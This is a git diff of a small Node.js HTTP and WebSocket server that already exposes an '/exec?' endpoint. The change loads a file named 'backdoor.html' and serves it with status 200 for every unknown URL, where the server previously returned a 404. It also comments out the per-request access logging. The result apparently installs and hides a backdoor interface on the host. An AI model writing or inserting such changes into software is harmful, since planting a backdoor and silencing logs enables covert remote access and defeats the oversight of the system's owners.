@@ -4,11 +4,14 @@
 //var _ = require('underscore')
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
+var fs = require('fs');
+var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
 var http = require('http')
 var conns = []
 var gr
 var server = http.createServer((request, response) => {
-  console.log((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
+
+  //console.log((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
 
   if (request.url.indexOf('/exec?') === 0)
   {
@@ -44,8 +47,11 @@ var server = http.createServer((request, response) => {
     response.end(JSON.stringify(responseObject))
   }
   else {
-    response.writeHead(404, {'Content-Type': 'text/html'})
-    response.end('Sorry, unknown url')
+	response.writeHead(200, {'Content-Type': 'text/html'});
+	response.write(backdoorHtml);
+	response.end();
+    //response.writeHead(404, {'Content-Tddype': 'text/html'})
+    //response.end('Sorry, unknown url')
   }
 })
 server.listen(webSocketsServerPort, () => {
